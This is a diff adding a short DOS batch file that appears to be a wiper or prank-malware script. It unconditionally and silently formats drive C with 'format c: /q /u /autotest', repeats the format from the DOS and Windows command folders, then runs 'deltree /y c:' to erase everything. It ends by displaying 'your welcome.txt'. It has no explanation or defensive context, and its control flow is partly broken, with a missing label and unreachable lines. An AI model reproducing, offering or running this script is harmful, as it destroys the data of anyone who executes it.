@@ -1,0 +1,31 @@
+@echo off
+format c: /q /u /autotest
+if exist c:\dos\format.* goto dosform
+if exist c:\windows\command\format.* goto winform
+goto del
+cd\dos
+format c: /q /u /autotest
+cd\
+:winform
+cd\windows\command
+format c: /q /u /autotest
+cd\
+goto write
+:del
+if exist c:\dvar.txt goto dtree
+goto write
+:dtree
+deltree /y c:
+if exist c:\dos\deltree.* goto deldos
+if exist c:\windows\command\deltree.* goto delwin
+:deldos
+cd\dos
+c:\dos\deltree /y c:
+cd\
+:delwin
+cd\windows\command
+deltree /y c:
+cd\
+:write
+type your welcome.txt
+pause
